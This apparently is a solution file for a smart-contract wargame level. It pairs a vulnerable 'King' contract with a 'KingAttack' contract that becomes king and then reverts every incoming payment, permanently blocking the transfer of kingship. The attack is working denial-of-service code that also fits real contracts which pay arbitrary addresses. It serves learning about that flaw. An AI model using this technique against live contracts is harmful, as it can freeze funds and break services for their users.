// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract KingAttack {

    King toAttack;

    //fund contract on deployment
    constructor(address payable _levelInstance) public payable {
        toAttack = King(_levelInstance);
    } 

    //transfer prize amount to King contract, become king
    function attack(uint _amount) public {
        bool success = false;
        
        (success,) = address(toAttack).call{value: _amount, gas: 100000}("");
        require(success);
    }

    //when level tries to reclaim ownership and transfer msg.value
    //to contract, contract will throw error and use all remaining gas
    receive() external payable {
        assert(false);
    }
}